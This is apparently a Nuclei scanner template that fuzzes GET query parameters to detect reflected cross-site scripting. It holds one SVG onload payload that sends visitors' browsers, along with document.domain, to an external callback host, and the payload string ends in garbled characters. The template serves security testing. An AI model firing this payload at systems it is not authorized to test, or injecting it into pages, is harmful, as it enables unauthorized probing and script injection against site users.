id: fuzz-reflection-xss-custom-2

info:
  name: Custom Reflection XSS Detection (Type: XSS)
  author: netbaan
  severity: high
  description: |
    This template checks for XSS vulnerabilities using a specified payload that reflects an SVG-based attack.

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'  # Run only on GET requests

    payloads:
      reflection:
        - "<svg/onload=location/**/='http://GH0ST.xss.ht/\\'+document.domï¿½"

    stop-at-first-match: true

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{reflection}}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{{reflection}}"

      - type: word
        part: header
        words:
          - "text/html"